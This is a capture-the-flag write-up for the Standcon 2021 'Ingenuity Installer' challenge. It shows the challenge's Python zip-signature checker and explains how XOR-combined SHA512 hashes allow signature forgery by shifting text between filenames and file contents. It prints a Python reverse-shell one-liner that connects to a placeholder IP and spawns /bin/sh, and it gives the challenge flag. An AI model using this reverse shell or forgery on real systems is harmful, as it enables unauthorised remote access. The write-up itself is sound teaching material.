---
layout: single
title:  "Ingenuity Installer"
date:   2021-07-24 12:05:00 +0800
categories: standcon-2021
permalink: /standcon-2021/ingenuity-installer
---

This is a challenge from Cryptography section of Standcon 2021. The challenge wants us to forge a signature of a zip file.

## Statement

>I've always wanted to drive a vehicle on another planet! I found the website they used to install software on Ingenuity. Could you help me get access to it pretty please?

<button class="collapsible btn" id="data">software-installer.py</button>

<div class="content" id="datadata" style="display:none" markdown="1">

```python
from shutil import rmtree
import subprocess
import zipfile

from Crypto.Hash import SHA512
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_v1_5

SETUP_FILE = 'setup_script.py'
SIGNATURE_FILE = 'signature.bin'
ZIP_DIR = 'firmware/'


# Checks if signature is correct
class Signature:
    def __init__(self, zip_filename='ingenuity_software-38575ea.zip'):
        self.zip_filename = zip_filename

        self._updateDir()

    def __del__(self):
        self.zip.close()

    def _updateDir(self):
        self.zip = zipfile.ZipFile(self.zip_filename, 'r')
        self.files = self.zip.namelist()

    def _checkValid(self):
        assert ZIP_DIR + SETUP_FILE in self.files
        assert ZIP_DIR + SIGNATURE_FILE in self.files

    def _xor(self, str1, str2):
        assert len(str1) == len(str2)
        return bytes((b1 ^ b2 for b1, b2 in zip(str1, str2)))

    def _calculateHash(self):
        try:
            self.files.remove(ZIP_DIR + SIGNATURE_FILE)
        except:
            pass

        final = b'\x00' * 64
        for file in self.files:
            contents = self.zip.read(file)
            h = SHA512.new(data=file.encode())
            h.update(contents)
            final = self._xor(final, h.digest())

        self.files = self.zip.namelist()

        return final

    def _signFiles(self, hash, priv='private_key.der'):
        key = RSA.import_key(open(priv, 'rb').read())

        digest = SHA512.new(hash)

        return PKCS1_v1_5.new(key).sign(digest)

    def _verifySignature(self, hash, pub='static/keys/public_key.der'):
        key = RSA.import_key(open(pub, 'rb').read())

        return PKCS1_v1_5.new(key).verify(SHA512.new(hash), self.zip.read(ZIP_DIR + SIGNATURE_FILE))

    def genSig(self, write=True):
        try:
            hash = self._calculateHash()
            sig = self._signFiles(hash)

            if write is True:
                with zipfile.ZipFile(self.zip_filename, 'a') as zipW:
                    zipW.writestr(data=sig, zinfo_or_arcname=ZIP_DIR + SIGNATURE_FILE)
        except:
            print('Something went wrong')
            return False

        self.zip.close()
        self._updateDir()

        return sig

    def checkSig(self):
        try:
            self._checkValid()
        except:
            print('setup_script.py or signature.bin missing!')
            return False

        try:
            hash = self._calculateHash()
            return self._verifySignature(hash)
        except:
            print('Something went wrong')
            return False


# Checks if zip file is legit
def checkZip(file):
    return zipfile.is_zipfile(file)


# Runs setup script if signature is valid
def runSetup(zip):
    path = zip.filename[:-4] + '/'
    zip.extractall(path=path)
    subprocess.run(['python', SETUP_FILE], cwd=path + ZIP_DIR)
    rmtree(path)
    
```
</div>

## Observation

First thing to do is to try to break the public key. It might be misconfigured RSA.

We can use [RSACtfTool](https://github.com/Ganapati/RsaCtfTool) to do this. But unfortunately, it is not vulnerable.

Usually if the private key is not retrivable, the only thing left for us to do is to try and exploit the hash function.

Observe that the hash function works by xor the hash for every files in the zip... This looks sus

## Solution

And indeed it is vulnerable! The idea is to create two identical file so that their hash will be cancelled after xor both of them together.

But how do we create 2 identical file? As we have the restriction to not able to create 2 files with the same name...

Let's check the hash again, 

```python
contents = self.zip.read(file)
h = SHA512.new(data=file.encode())
h.update(contents)
```

This means that it is actually doing `hash(file.encode() + file.content())`.

And `file.encode()` is just the filepath of the file!

So we can just modify the filename to create 2 files with the same hash!

Example:

If we have a file

`setup_script.py`
```python
print('hello')
```

The hash will be `hash('setup_script.py' + 'print('hello')')`

The identical file can be

`setup_scr`
```python
ipt.pyprint('hello')
```

The hash will be `hash('setup_scr' + 'ipt.pyprint('hello')')`

These 2 files will have the same hash!

The challenge also provided us a valid zip with a valid signature. We need to insert our own setup_script.py with a reverse shell script to gain access to the server.

So how do we do with the old `setup_script.py`?

Modify the filename!

Reverse shell script

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",12321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
```

In the end we get the shell and find the flag first with this command

`find / -name "flag*" 2>/dev/null`

Then we cat out the flag.

flag : `STC{my_b4773ry_15_l0w_4nd_175_63771n6_d4rk}`
